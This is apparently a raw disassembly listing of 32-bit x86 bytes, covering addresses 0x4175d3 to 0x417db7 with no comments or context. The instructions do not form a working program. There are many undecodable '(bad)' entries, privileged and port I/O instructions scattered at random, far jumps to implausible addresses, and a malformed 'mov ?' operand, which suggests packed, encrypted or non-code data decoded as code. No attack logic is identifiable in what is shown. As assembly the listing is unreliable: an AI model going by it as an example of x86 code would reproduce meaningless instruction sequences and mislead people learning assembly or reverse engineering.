  4175d3:	enter  0x8ecc,0x51
  4175d7:	leave  
  4175d8:	(bad)  
  4175d9:	dec    edi
  4175da:	or     eax,0x853fa016
  4175df:	or     BYTE PTR [edx],bl
  4175e1:	jbe    0x4175ad
  4175e3:	call   0x8e7be21c
  4175e8:	fidivr WORD PTR [eax-0x2bdfa733]
  4175ee:	mov    edx,0xe562fa6a
  4175f3:	inc    ebp
  4175f4:	ror    BYTE PTR [edx-0x16],1
  4175f7:	leave  
  4175f8:	test   eax,0xe216fbff
  4175fd:	lock adc al,0xbc
  417600:	loope  0x417630
  417602:	mov    ds:0x41e1df16,al
  417607:	mov    bl,0xd1
  417609:	push   0x4dc763e5
  41760e:	imul   ebx
  417610:	jae    0x4175c6
  417612:	ja     0x4175cc
  417614:	int3   
  417615:	xor    ebx,DWORD PTR [edi-0x25a804a5]
  41761b:	dec    eax
  41761c:	ins    BYTE PTR es:[edi],dx
  41761d:	adc    BYTE PTR [edx-0x74],cl
  417620:	fcom   QWORD PTR [ebx+eax*1+0x4b]
  417624:	je     0x417657
  417626:	mov    bl,0x6c
  417628:	xor    ah,ah
  41762a:	push   esp
  41762b:	loope  0x41763a
  41762d:	stc    
  41762e:	aad    0xc5
  417630:	(bad)  
  417631:	fst    DWORD PTR [edx+esi*2-0x2d]
  417635:	into   
  417636:	sbb    al,0xad
  417638:	mov    al,0x26
  41763a:	jl     0x417605
  41763c:	out    0xfe,eax
  41763e:	pop    es
  41763f:	dec    ebp
  417640:	pop    esp
  417641:	jmp    0x85c6:0xdc0f99cf
  417648:	out    0xf4,al
  41764a:	dec    ebx
  41764b:	add    al,0x49
  41764d:	mov    bl,0x2e
  41764f:	sbb    ebx,DWORD PTR [ebx+0x198b808e]
  417655:	rcl    BYTE PTR ds:0x9018d88,cl
  41765b:	mov    cl,0x2e
  41765d:	sbb    al,0x5e
  41765f:	lahf   
  417660:	push   edx
  417661:	cli    
  417662:	iret   
  417663:	push   ds
  417664:	fisttp QWORD PTR [eax+ebx*4]
  417667:	mov    ds:0x355785ba,eax
  41766c:	pop    esp
  41766d:	shl    BYTE PTR [eax-0x4],cl
  417670:	or     dh,bh
  417672:	cli    
  417673:	jge    0x417608
  417675:	aad    0x6c
  417677:	mov    ch,0xb2
  417679:	(bad)  
  41767a:	xchg   esp,eax
  41767b:	adc    DWORD PTR [ebx+0x1e],ebp
  41767e:	add    DWORD PTR [edi-0x7e5d28d2],edi
  417684:	stos   BYTE PTR es:[edi],al
  417685:	adc    eax,0x5c4fbb9e
  41768a:	outs   dx,BYTE PTR ds:[esi]
  41768b:	xor    al,bh
  41768d:	or     DWORD PTR [ecx+0x77d28732],edx
  417693:	jnp    0x4176ff
  417695:	loop   0x41767f
  417697:	cli    
  417698:	cmp    eax,0x99a44a5a
  41769d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41769e:	out    0xd5,eax
  4176a0:	imul   esi,esp,0xffffff89
  4176a3:	adc    eax,ecx
  4176a5:	or     al,0xe
  4176a7:	in     eax,dx
  4176a8:	xor    al,0x3f
  4176aa:	xor    ch,BYTE PTR [edx-0xf1de855]
  4176b0:	sub    eax,0xb3339f42
  4176b5:	push   esi
  4176b6:	push   esi
  4176b7:	inc    esi
  4176b8:	cmc    
  4176b9:	lods   eax,DWORD PTR ds:[esi]
  4176ba:	outs   dx,DWORD PTR ds:[esi]
  4176bb:	ins    DWORD PTR es:[edi],dx
  4176bc:	addr16 ds lahf 
  4176bf:	mov    fs:0x78e1403c,eax
  4176c5:	fdivr  DWORD PTR ds:0xd778c0ed
  4176cb:	int3   
  4176cc:	adc    BYTE PTR [ecx+0x38],dl
  4176cf:	push   esi
  4176d0:	leave  
  4176d1:	dec    ebx
  4176d2:	imul   esi,DWORD PTR [eax-0x5cad810f],0x64
  4176d9:	retf   0xda31
  4176dc:	pop    eax
  4176dd:	outs   dx,BYTE PTR ds:[esi]
  4176de:	and    bh,ah
  4176e0:	push   cs
  4176e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176e2:	sub    edi,DWORD PTR [ebx+edx*1]
  4176e5:	pop    edx
  4176e6:	adc    esp,DWORD PTR [ebx]
  4176e8:	mov    bh,0x5d
  4176ea:	dec    ebx
  4176eb:	ins    DWORD PTR es:[edi],dx
  4176ec:	(bad)  
  4176ed:	add    ah,BYTE PTR [edx-0x9849825]
  4176f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176f4:	les    esp,FWORD PTR [ecx]
  4176f6:	call   0xbc6b:0x6203f824
  4176fd:	or     ecx,DWORD PTR [ebx]
  4176ff:	out    0xe8,al
  417701:	jmp    0xbe3e:0xbece
  417707:	cmp    cl,ah
  417709:	scas   eax,DWORD PTR es:[edi]
  41770a:	mov    cl,BYTE PTR [ebx+0x5f8da84a]
  417710:	xchg   bh,bh
  417712:	fcmovu st,st(6)
  417714:	sub    BYTE PTR [ecx+ecx*1-0x3b],cl
  417718:	mov    esp,0x3ae80340
  41771d:	stc    
  41771e:	xor    BYTE PTR [eax+ecx*1+0x76],ah
  417722:	cmp    DWORD PTR [edi],esp
  417724:	enter  0x90a2,0xcf
  417728:	jbe    0x41776d
  41772a:	pushf  
  41772b:	push   ebx
  41772c:	std    
  41772d:	jb     0x41775f
  41772f:	mov    ebp,DWORD PTR [edi]
  417731:	pop    ds
  417732:	punpcklwd mm7,DWORD PTR [ebx-0x73]
  417736:	mov    ds,WORD PTR [ecx+ecx*2+0x7565df4d]
  41773d:	inc    esi
  41773e:	loopne 0x417793
  417740:	add    edx,esi
  417742:	fwait
  417743:	and    ah,BYTE PTR [eax+0x14eb2d92]
  417749:	jmp    0x17f:0x367edef8
  417750:	and    eax,0x15afec70
  417755:	pop    ebp
  417756:	xchg   ch,bl
  417758:	xchg   ebp,eax
  417759:	arpl   dx,si
  41775b:	imul   ebx,DWORD PTR ds:0x9246ad2a,0x80c6fa6c
  417765:	mov    dl,BYTE PTR [edi]
  417767:	or     esi,DWORD PTR [eax-0x27]
  41776a:	pop    ss
  41776b:	push   cs
  41776c:	mov    ds:0x5e4d5574,eax
  417771:	loope  0x41771d
  417773:	add    BYTE PTR [ebx+0x5dadcefd],ch
  417779:	enter  0xd4c5,0xb2
  41777d:	test   al,0x97
  41777f:	retf   0x18eb
  417782:	fs sub eax,0x550fd444
  417788:	int3   
  417789:	js     0x4177ef
  41778b:	push   ss
  41778c:	cmp    ch,BYTE PTR [edi-0x3469564c]
  417792:	loope  0x417715
  417794:	in     al,0x9e
  417796:	cmp    ecx,DWORD PTR [ecx]
  417798:	pop    ebx
  417799:	or     DWORD PTR [eax+0x41],edi
  41779c:	call   0xa47f224f
  4177a1:	mov    ebp,0xa0b2c91e
  4177a6:	mov    edx,0x72328b93
  4177ab:	pop    es
  4177ac:	ins    DWORD PTR es:[edi],dx
  4177ad:	adc    BYTE PTR [ebx+ecx*8-0x5b380ec8],bh
  4177b4:	jmp    0xe724:0x7c58bbc5
  4177bb:	cmp    dl,al
  4177bd:	push   ecx
  4177be:	inc    eax
  4177c0:	jns    0x417839
  4177c2:	or     BYTE PTR [eax-0x2f],0x24
  4177c6:	(bad)  
  4177c7:	xor    al,0xdc
  4177c9:	push   eax
  4177ca:	push   0x64e1606b
  4177cf:	sub    BYTE PTR [esi+0xb],al
  4177d2:	push   es
  4177d3:	jp     0x417831
  4177d5:	jle    0x4177c5
  4177d7:	outs   dx,BYTE PTR ds:[esi]
  4177d8:	test   DWORD PTR [ecx-0x7f],0xbabff825
  4177df:	scas   al,BYTE PTR es:[edi]
  4177e0:	or     BYTE PTR [ebx],0xe2
  4177e3:	lea    edx,[edx+0x49]
  4177e6:	out    0x58,al
  4177e8:	inc    edx
  4177e9:	dec    ecx
  4177ea:	mov    al,ds:0x86919093
  4177ef:	retf   0x7261
  4177f2:	jle    0x417774
  4177f4:	(bad)  
  4177f5:	lock aas 
  4177f7:	cld    
  4177f8:	and    cl,0xa
  4177fb:	lock leave 
  4177fd:	pusha  
  4177fe:	daa    
  4177ff:	and    eax,0x22d8f35d
  417804:	and    BYTE PTR [ebp-0xf],ah
  417807:	mov    edi,0x1b71faf
  41780c:	ret    0x24b8
  41780f:	inc    eax
  417810:	dec    ebx
  417811:	dec    ah
  417813:	pushf  
  417814:	out    dx,eax
  417815:	cdq    
  417816:	jle    0x4177e4
  417818:	fidiv  WORD PTR [edi-0x318ba1a9]
  41781e:	add    al,0x11
  417820:	push   0x9c605c6f
  417825:	aam    0x36
  417827:	iret   
  417828:	mov    al,ds:0x58fc231
  41782d:	test   BYTE PTR [esi+0x2b],0xf0
  417831:	xor    dl,BYTE PTR [ecx-0x53a0963e]
  417837:	test   eax,0x8028fe06
  41783c:	addr16 aam 0x1e
  41783f:	push   ds
  417840:	je     0x417839
  417842:	mov    ecx,0xad48e8e6
  417847:	in     al,0xe6
  417849:	or     BYTE PTR [esi+0x45a5872d],ch
  41784f:	mov    cl,0x9d
  417851:	sub    edx,DWORD PTR [ecx]
  417853:	jmp    0x6287:0xe40ddca4
  41785a:	ret    0xe4c6
  41785d:	shr    BYTE PTR ds:0xee395f2e,cl
  417863:	jbe    0x417870
  417865:	or     edx,esi
  417867:	dec    esi
  417868:	rol    DWORD PTR [esi+0x7f78fd7c],cl
  41786e:	push   0xffffffac
  417870:	call   0xc9ab26f3
  417875:	mov    ecx,DWORD PTR [esp+esi*8-0x4f]
  417879:	scas   al,BYTE PTR es:[edi]
  41787a:	mov    dl,0x8d
  41787c:	pop    eax
  41787d:	inc    eax
  41787e:	pop    ebp
  41787f:	test   DWORD PTR [ecx],ecx
  417881:	adc    DWORD PTR [esi-0xe],0x43
  417885:	jp     0x4178f3
  417887:	leave  
  417888:	not    DWORD PTR [esi-0x43]
  41788b:	cmp    cl,BYTE PTR [edi+0x3e]
  41788e:	dec    ecx
  41788f:	dec    DWORD PTR [eax+0x3b]
  417892:	push   edi
  417893:	mov    edx,0x8de743e3
  417898:	cdq    
  417899:	or     eax,0xdb854843
  41789e:	add    ebx,DWORD PTR [ecx]
  4178a0:	inc    ecx
  4178a1:	or     BYTE PTR ds:0x30e9ba22,cl
  4178a7:	jg     0x417831
  4178a9:	jne    0x417885
  4178ab:	jmp    0xc4bc:0xa9506332
  4178b2:	shl    BYTE PTR [edx+0x20],cl
  4178b5:	test   al,0x9a
  4178b7:	(bad)  
  4178b9:	retf   
  4178ba:	(bad)
  4178bd:	inc    esp
  4178be:	and    eax,0xcf5f7d16
  4178c3:	inc    edx
  4178c4:	or     al,0xe
  4178c6:	push   edx
  4178c7:	or     eax,0x7552fbc8
  4178cc:	push   edx
  4178cd:	cmp    esp,edi
  4178cf:	scas   al,BYTE PTR es:[edi]
  4178d0:	pusha  
  4178d1:	jle    0x417940
  4178d3:	adc    bl,bh
  4178d5:	(bad)  
  4178d6:	sub    eax,0x20f67216
  4178db:	xlat   BYTE PTR ds:[ebx]
  4178dc:	outs   dx,DWORD PTR ds:[esi]
  4178dd:	les    edx,FWORD PTR [esp+esi*8-0x5b42d6cc]
  4178e4:	sahf   
  4178e5:	dec    esi
  4178e6:	(bad)  
  4178e7:	sbb    BYTE PTR [esi+0x61],bh
  4178ea:	inc    ebp
  4178eb:	pop    es
  4178ec:	retf   
  4178ed:	xchg   esi,eax
  4178ee:	rol    DWORD PTR ds:0xbb90278,cl
  4178f4:	xor    BYTE PTR [ebx+0x582c7366],bh
  4178fa:	jmp    0xdfe80d8
  4178ff:	cld    
  417900:	sub    esi,ecx
  417902:	fmulp  st(3),st
  417904:	cmp    BYTE PTR [ebp-0x7b803175],ah
  41790a:	jle    0x41793a
  41790c:	jle    0x4178dc
  41790e:	ja     0x41789d
  417910:	rcl    DWORD PTR [edx],1
  417912:	xchg   edx,eax
  417913:	rol    BYTE PTR [ecx+0x1efc5eb3],1
  417919:	out    0xef,eax
  41791b:	push   ebp
  41791c:	mov    esi,0x5a87f0d0
  417921:	jb     0x417981
  417923:	inc    edx
  417924:	or     ebp,DWORD PTR [ebx+ebp*1+0x2a]
  417928:	icebp  
  417929:	pop    es
  41792a:	in     eax,dx
  41792b:	fwait
  41792c:	jns    0x41793d
  41792e:	mov    eax,ds:0x1cc4110c
  417933:	or     BYTE PTR [edi-0x34cd1e3a],ch
  417939:	and    eax,0xa29ccc3f
  41793e:	push   0xfd3c8176
  417943:	push   esi
  417944:	xchg   ebp,eax
  417945:	xchg   ebp,eax
  417946:	arpl   WORD PTR [edi+eiz*1+0x25],ax
  41794a:	inc    esi
  41794b:	mov    ecx,fs
  41794d:	(bad)  
  41794e:	in     al,dx
  41794f:	cmp    DWORD PTR [ecx-0x51],edx
  417952:	mov    esp,0x4cd38926
  417957:	jle    0x4178f1
  417959:	push   ds
  41795a:	pop    edx
  41795b:	and    esp,DWORD PTR [eax+0x77cc6c9]
  417961:	pop    ebp
  417962:	ret    
  417963:	or     al,0x5b
  417965:	xlat   BYTE PTR ds:[ebx]
  417966:	xchg   ebp,eax
  417967:	jg     0x4179bf
  417969:	sub    DWORD PTR [esi+0x12],edx
  41796c:	mov    bl,0x2f
  41796e:	fild   WORD PTR [eax]
  417970:	jae    0x41795c
  417972:	xchg   edx,eax
  417973:	pop    es
  417974:	or     eax,0x30b7fc94
  417979:	jmp    0x2045:0xe0687486
  417980:	call   0x3fcf:0xa5afa6b0
  417987:	dec    esp
  417988:	push   es
  417989:	inc    BYTE PTR [ebx+ebx*1+0x54ce2ae9]
  417990:	mov    ds:0x7efc3850,al
  417995:	push   es
  417996:	es dec esi
  417998:	mov    al,ds:0x8a256cc5
  41799d:	mov    ch,0xa4
  41799f:	or     DWORD PTR [ebx-0x2442b568],0xffffffe2
  4179a6:	xlat   BYTE PTR ds:[ebx]
  4179a7:	sub    edx,edi
  4179a9:	into   
  4179aa:	repz xchg esp,esi
  4179ad:	fs aam 0xf7
  4179b0:	loop   0x417955
  4179b2:	retf   0xdb30
  4179b5:	jg     0x417988
  4179b7:	jo     0x41795f
  4179b9:	jb     0x41796f
  4179bb:	aaa    
  4179bc:	push   ebp
  4179bd:	add    BYTE PTR [edi-0x2c],bl
  4179c0:	or     eax,0xa494fcd4
  4179c5:	frstor [eax]
  4179c7:	pop    ebx
  4179c8:	mov    cl,0xbe
  4179ca:	jge    0x417a00
  4179cc:	xor    al,0x24
  4179ce:	cmp    edx,ecx
  4179d0:	(bad)  
  4179d1:	push   edx
  4179d2:	cmp    cl,BYTE PTR [edi]
  4179d4:	cmp    BYTE PTR [esi+edi*2-0x7f],ah
  4179d8:	or     bl,cl
  4179da:	mov    DWORD PTR [edx-0x335accc6],eax
  4179e0:	inc    ebp
  4179e1:	loopne 0x417a17
  4179e3:	sahf   
  4179e4:	not    BYTE PTR [ecx]
  4179e6:	jnp    0x417a64
  4179e8:	dec    esi
  4179e9:	mov    edi,0x8f8c5cc5
  4179ee:	mov    DWORD PTR [edi],ebp
  4179f0:	cs inc ecx
  4179f2:	test   al,0x12
  4179f4:	xchg   esi,eax
  4179f5:	mov    al,ds:0xad47f0be
  4179fa:	xchg   ebx,eax
  4179fb:	or     al,0xe
  4179fd:	sahf   
  4179fe:	call   0x946234e0
  417a03:	cwde   
  417a04:	pop    eax
  417a05:	cmp    esi,edi
  417a07:	jnp    0x417a87
  417a09:	icebp  
  417a0a:	lahf   
  417a0b:	push   DWORD PTR [ebx-0x16f3a18e]
  417a11:	sbb    eax,0x460c89c0
  417a16:	push   edx
  417a17:	or     edi,DWORD PTR [ecx+0x29764929]
  417a1d:	mov    bl,0x63
  417a1f:	xlat   BYTE PTR ds:[ebx]
  417a20:	mov    edx,0x3be83658
  417a25:	icebp  
  417a26:	jb     0x4179d6
  417a28:	int    0x64
  417a2a:	push   esp
  417a2b:	mov    ch,0x54
  417a2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a2e:	pop    ebp
  417a2f:	(bad)  
  417a30:	leave  
  417a31:	mov    dl,ah
  417a33:	push   ebx
  417a34:	pushf  
  417a35:	adc    al,0xa6
  417a37:	jae    0x417a7b
  417a39:	jns    0x4179fc
  417a3b:	inc    DWORD PTR [ebx-0x19]
  417a3e:	shl    ch,0x9d
  417a41:	and    BYTE PTR ds:0x99748495,ah
  417a47:	sbb    BYTE PTR [edi],dh
  417a49:	xor    dl,BYTE PTR [eax]
  417a4b:	clc    
  417a4c:	pop    esi
  417a4d:	mov    bl,0xd0
  417a4f:	inc    ebx
  417a50:	add    DWORD PTR [ebx+ecx*8],edx
  417a53:	xlat   BYTE PTR ds:[ebx]
  417a54:	adc    DWORD PTR [edi-0x44],ebp
  417a57:	pop    edx
  417a58:	xor    BYTE PTR [edx+edi*2-0x182a065b],bl
  417a5f:	jle    0x6aaee14
  417a65:	test   al,0x3b
  417a67:	pusha  
  417a68:	xlat   BYTE PTR ds:[ebx]
  417a69:	lods   eax,DWORD PTR ds:[esi]
  417a6a:	aaa    
  417a6b:	out    dx,eax
  417a6c:	(bad)  
  417a6e:	fucomp st(5)
  417a70:	and    al,0x4e
  417a72:	push   0xc72a7ef6
  417a77:	jno    0x4179fa
  417a79:	add    al,0x30
  417a7b:	mov    gs:0x36878cdb,eax
  417a81:	sbb    BYTE PTR ds:0xcda23df0,ch
  417a87:	stos   DWORD PTR es:[edi],eax
  417a88:	mov    esp,0xa221f564
  417a8d:	jg     0x417ac9
  417a8f:	lahf   
  417a90:	mov    al,ds:0x173a1804
  417a95:	stos   DWORD PTR es:[edi],eax
  417a96:	cmc    
  417a97:	adc    bl,BYTE PTR [ebx]
  417a99:	and    DWORD PTR [edi],edx
  417a9b:	add    eax,0x4c16b57e
  417aa0:	test   BYTE PTR [edi],dl
  417aa2:	push   ebx
  417aa3:	into   
  417aa4:	dec    ebx
  417aa5:	cmc    
  417aa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417aa7:	ja     0x417a73
  417aa9:	pop    ss
  417aaa:	cmp    ah,ch
  417aac:	mov    ch,0x77
  417aae:	adc    eax,0xfa945a8a
  417ab3:	mov    ecx,eax
  417ab5:	jmp    0x49580fc3
  417aba:	and    al,0x7b
  417abc:	pop    edi
  417abd:	hlt    
  417abe:	sbb    ch,BYTE PTR [ebp+0x1d]
  417ac1:	retf   
  417ac2:	add    ah,BYTE PTR [ebp-0x2a]
  417ac5:	push   ss
  417ac6:	popa   
  417ac7:	in     al,0x96
  417ac9:	pop    ebp
  417aca:	icebp  
  417acb:	ret    
  417acc:	ins    DWORD PTR es:[edi],dx
  417acd:	dec    esp
  417ace:	sar    BYTE PTR [edx-0x6c],cl
  417ad1:	jbe    0x417ac7
  417ad3:	out    0x9d,al
  417ad5:	es pop esi
  417ad7:	mov    ebx,0x4ea2fe3b
  417adc:	(bad)  
  417add:	pop    ecx
  417ade:	add    eax,0x348b5399
  417ae3:	mov    cl,0x74
  417ae5:	add    cl,BYTE PTR [esi-0x805c9cd]
  417aeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417aec:	shl    BYTE PTR [edx],cl
  417aee:	out    0x97,eax
  417af0:	lea    eax,[edx+edx*1]
  417af3:	cwde   
  417af4:	push   0x1a
  417af6:	dec    esi
  417af7:	push   eax
  417af8:	xchg   esi,eax
  417af9:	or     eax,0x7e71b23e
  417afe:	fs jg  0x417b74
  417b01:	fadd   st,st(2)
  417b03:	iret   
  417b04:	stos   BYTE PTR es:[edi],al
  417b05:	or     al,0x90
  417b07:	imul   BYTE PTR [esi+0x6]
  417b0a:	je     0x417b62
  417b0c:	xor    DWORD PTR [edi+0x13],0x680f4fc3
  417b13:	push   ebp
  417b14:	fisub  DWORD PTR [esi-0x5988754d]
  417b1a:	es fadd st(4),st
  417b1d:	test   DWORD PTR [ebx+ebp*2+0x7bc5c53f],edi
  417b24:	dec    edi
  417b25:	xchg   ebp,eax
  417b26:	or     al,0x4e
  417b28:	fdivr  DWORD PTR [ebx+ecx*2-0x37]
  417b2c:	lock es push 0x5b
  417b30:	xchg   edi,eax
  417b31:	sub    DWORD PTR [eax+eax*4+0x3],0x26d6063e
  417b39:	outs   dx,BYTE PTR ds:[esi]
  417b3a:	lods   eax,DWORD PTR ds:[esi]
  417b3b:	xlat   BYTE PTR ds:[ebx]
  417b3c:	dec    ebp
  417b3d:	jns    0x417b6c
  417b3f:	pop    ebx
  417b40:	test   eax,0xd2a201ed
  417b45:	sbb    BYTE PTR [eax],al
  417b47:	test   al,0x60
  417b49:	out    0x1c,al
  417b4b:	cmp    ch,BYTE PTR [eax+esi*8+0x7d488725]
  417b52:	ror    DWORD PTR [edx+0x17bb3a17],cl
  417b58:	adc    DWORD PTR [edi+0x1e],0x28
  417b5c:	sbb    DWORD PTR [edx-0x71925200],edx
  417b62:	ins    DWORD PTR es:[edi],dx
  417b63:	xchg   esi,eax
  417b64:	dec    edx
  417b65:	aaa    
  417b66:	pop    ds
  417b67:	stos   DWORD PTR es:[edi],eax
  417b68:	imul   esi,DWORD PTR [ecx+0x7e2ffe58],0x3c70d491
  417b72:	nop    DWORD PTR [esi]
  417b75:	push   0x10
  417b77:	pusha  
  417b78:	inc    ebx
  417b79:	pop    eax
  417b7a:	inc    edi
  417b7b:	fnstsw WORD PTR [edx-0x1648b071]
  417b81:	daa    
  417b82:	push   es
  417b83:	cmp    BYTE PTR [ebx-0x6c],ch
  417b86:	push   ebx
  417b87:	test   BYTE PTR [edx+eax*1-0x76f57ce2],cl
  417b8e:	adc    DWORD PTR [eax],esi
  417b90:	out    0x55,al
  417b92:	lahf   
  417b93:	xchg   ecx,eax
  417b94:	xor    esp,eax
  417b96:	hlt    
  417b97:	push   0x71ba0163
  417b9c:	xor    al,0xf0
  417b9e:	je     0x417b45
  417ba0:	sub    ebx,ebx
  417ba2:	cwde   
  417ba3:	and    BYTE PTR [edx-0x657a6617],bh
  417ba9:	xchg   esp,eax
  417baa:	mov    edx,0x88375f5e
  417baf:	test   eax,0x10b54d68
  417bb4:	lahf   
  417bb5:	jecxz  0x417c25
  417bb7:	jo     0x417b63
  417bb9:	(bad)
  417bbd:	stos   BYTE PTR es:[edi],al
  417bbe:	cli    
  417bbf:	(bad)  [ebp+0x46ad3927]
  417bc5:	(bad)  [edx+eax*4]
  417bc8:	mov    bh,0xdf
  417bca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bcb:	cmp    DWORD PTR [edx-0x2c],ecx
  417bce:	in     al,0x56
  417bd0:	jmp    DWORD PTR [eax]
  417bd2:	xchg   ecx,eax
  417bd3:	dec    ebx
  417bd4:	dec    esi
  417bd5:	ror    BYTE PTR [ebp+0xee0e947],1
  417bdb:	jge    0x417bd8
  417bdd:	and    eax,0xe10cd93f
  417be2:	popa   
  417be3:	loopne 0x417bd5
  417be5:	jge    0x417bdb
  417be7:	sbb    eax,0x445fb198
  417bec:	dec    ebx
  417bed:	cmp    DWORD PTR [ebp-0x4e6e3049],ebp
  417bf3:	imul   eax,DWORD PTR [eax],0xf3e78604
  417bf9:	arpl   WORD PTR [edi+0x6e],dx
  417bfc:	pop    eax
  417bfd:	mov    ah,0x63
  417bff:	push   edi
  417c00:	jno    0x417bd1
  417c02:	mov    ?,WORD PTR [ebx-0x121cd1de]
  417c08:	repnz xchg esp,eax
  417c0a:	jge    0x417b8c
  417c0c:	into   
  417c0d:	mov    cl,0xb4
  417c0f:	jg     0x417c1c
  417c11:	rcr    DWORD PTR [ecx+0x61],1
  417c14:	outs   dx,BYTE PTR ds:[esi]
  417c15:	jmp    0x5fa2419a
  417c1a:	pop    ebp
  417c1b:	xchg   esp,eax
  417c1c:	jbe    0x417c41
  417c1e:	jo     0x417c16
  417c20:	les    edi,FWORD PTR [eax+0x7]
  417c23:	add    BYTE PTR [ecx],dh
  417c25:	dec    edx
  417c26:	and    eax,0x64400ce6
  417c2b:	sahf   
  417c2c:	ja     0x417c82
  417c2e:	scas   al,BYTE PTR es:[di]
  417c30:	sub    DWORD PTR [ebp-0x352ccdf2],0xfffffff8
  417c37:	loopne 0x417c93
  417c39:	(bad)  
  417c3a:	jne    0x417cb2
  417c3c:	cmp    eax,0xcae21500
  417c41:	hlt    
  417c42:	rol    DWORD PTR [ebp+0xe3c07f7],cl
  417c48:	push   ss
  417c49:	lds    edi,FWORD PTR [ecx-0x6452d299]
  417c4f:	mov    ebp,0x1daaddb5
  417c54:	sar    DWORD PTR [eax-0x20e033e6],1
  417c5a:	stc    
  417c5b:	loope  0x417cb4
  417c5d:	inc    eax
  417c5e:	and    DWORD PTR [esi],edx
  417c60:	(bad)  
  417c61:	in     al,0xc1
  417c63:	sbb    DWORD PTR [ebp+0x3f],esi
  417c66:	jl     0x417c2d
  417c68:	repnz test eax,0x97e6826e
  417c6e:	add    esp,edx
  417c70:	das    
  417c71:	test   DWORD PTR [ecx+0xd4d8146],edx
  417c77:	pop    ebx
  417c78:	cwde   
  417c79:	or     al,0x83
  417c7b:	mov    dh,0x1c
  417c7d:	lahf   
  417c7e:	mov    ch,0x49
  417c80:	lods   al,BYTE PTR ds:[esi]
  417c81:	loop   0x417cc6
  417c83:	jmp    0x26794771
  417c88:	dec    esp
  417c89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c8a:	leave  
  417c8b:	test   WORD PTR [edi+eax*2],ax
  417c8f:	(bad)  
  417c91:	(bad)  
  417c92:	jbe    0x417c71
  417c94:	or     BYTE PTR [edx-0x2f],dh
  417c97:	dec    DWORD PTR [ebp-0x57b57e6b]
  417c9d:	loop   0x417cb5
  417c9f:	dec    ebx
  417ca0:	mov    ecx,0x1150730d
  417ca5:	ins    DWORD PTR es:[edi],dx
  417ca6:	mov    ah,0x3e
  417ca8:	popf   
  417ca9:	stos   BYTE PTR es:[edi],al
  417caa:	add    al,0xbb
  417cac:	inc    esi
  417cad:	les    edi,FWORD PTR [ebx-0x2a8c434e]
  417cb3:	jle    0x417cf4
  417cb5:	cmp    ch,BYTE PTR [edi-0x39]
  417cb8:	outs   dx,DWORD PTR ds:[esi]
  417cb9:	push   cs
  417cba:	mov    ebx,edi
  417cbc:	ja     0x417d26
  417cbe:	std    
  417cbf:	lock pop edx
  417cc1:	pop    edi
  417cc2:	mov    bh,0x93
  417cc4:	bound  edi,QWORD PTR ds:0x554fe228
  417cca:	test   ecx,ecx
  417ccc:	jmp    FWORD PTR [ebp-0x20]
  417ccf:	fsubr  st(4),st
  417cd1:	out    dx,al
  417cd2:	pop    ds
  417cd3:	jle    0x417ccd
  417cd5:	mov    esp,0xcaca793e
  417cda:	or     dl,dl
  417cdc:	(bad)  
  417cdd:	gs test al,0x8e
  417ce0:	xchg   ebx,eax
  417ce1:	outs   dx,BYTE PTR ds:[esi]
  417ce2:	jl     0x417d0d
  417ce4:	gs retf 0xf47
  417ce8:	mov    edi,0x49edd8f0
  417ced:	xchg   ebx,eax
  417cee:	fild   DWORD PTR [esi]
  417cf0:	xchg   edx,eax
  417cf1:	stos   DWORD PTR es:[edi],eax
  417cf2:	lods   al,BYTE PTR ds:[esi]
  417cf3:	frstor [esi]
  417cf5:	shl    eax,1
  417cf7:	bound  ecx,QWORD PTR [eax]
  417cf9:	fisubr WORD PTR [ecx+ecx*2+0x472c180e]
  417d00:	in     eax,dx
  417d01:	xchg   esi,eax
  417d02:	iret   
  417d03:	fld    DWORD PTR [eax+ebx*2]
  417d06:	sbb    eax,0xaa8cc3cf
  417d0b:	cmp    dh,BYTE PTR ss:[edi]
  417d0e:	inc    ecx
  417d0f:	dec    ecx
  417d10:	push   ss
  417d11:	ss loope 0x417cc0
  417d14:	addr16 popf 
  417d16:	dec    esi
  417d17:	adc    bl,ch
  417d19:	lahf   
  417d1a:	inc    ebp
  417d1b:	nop
  417d1c:	jae    0x417d4a
  417d1e:	jp     0x417cfb
  417d20:	int3   
  417d21:	mov    al,0x47
  417d23:	push   0xff603c09
  417d28:	sbb    eax,0x3367c27a
  417d2d:	push   esp
  417d2e:	mov    ds:0x8b46132a,eax
  417d33:	retf   0xbc8a
  417d36:	xchg   esp,eax
  417d37:	aaa    
  417d38:	sub    BYTE PTR cs:[ecx+0x7729269a],cl
  417d3f:	sub    DWORD PTR [ebp-0x108fde5b],ebx
  417d45:	sub    al,0x6a
  417d47:	push   ecx
  417d48:	lds    esi,FWORD PTR [edi+0xa812df3]
  417d4e:	dec    ebx
  417d4f:	call   0xfa3ac61a
  417d54:	inc    esi
  417d55:	xchg   DWORD PTR [edx+0x23af54ca],ebp
  417d5b:	mov    ds:0x98f30b8f,eax
  417d60:	mov    ecx,0x8cbd6fed
  417d65:	retw   0x1e1a
  417d69:	lea    eax,[edx+0x72]
  417d6c:	leave  
  417d6d:	imul   ecx,DWORD PTR [eax],0x29d9ba24
  417d73:	pop    esp
  417d74:	popa   
  417d75:	test   eax,0xf9b31816
  417d7a:	shl    ah,0x78
  417d7d:	sbb    BYTE PTR [ecx+0x32],al
  417d80:	mov    ecx,0xe9e737c5
  417d85:	xchg   BYTE PTR [edi],ah
  417d87:	int3   
  417d88:	push   ds
  417d89:	test   al,0xc5
  417d8b:	addr16 in eax,dx
  417d8d:	fst    QWORD PTR [eax+0x7]
  417d90:	repz aam 0x5
  417d93:	jl     0x417d78
  417d95:	inc    esi
  417d96:	xor    eax,0x24691e78
  417d9b:	repnz movs WORD PTR es:[edi],WORD PTR ds:[esi]
  417d9e:	cdq    
  417d9f:	addr16 sub al,0xb9
  417da2:	dec    edx
  417da3:	lods   al,BYTE PTR ds:[esi]
  417da4:	mov    ds:0xbcf9602,eax
  417da9:	mov    ch,0x47
  417dab:	fs nop
  417dad:	test   bh,0xf0
  417db0:	push   ecx
  417db1:	or     BYTE PTR [edi+edx*1-0x5a],dh
  417db5:	(bad)  
  417db6:	xlat   BYTE PTR ds:[ebx]
  417db7:	and    eax,0x46322717
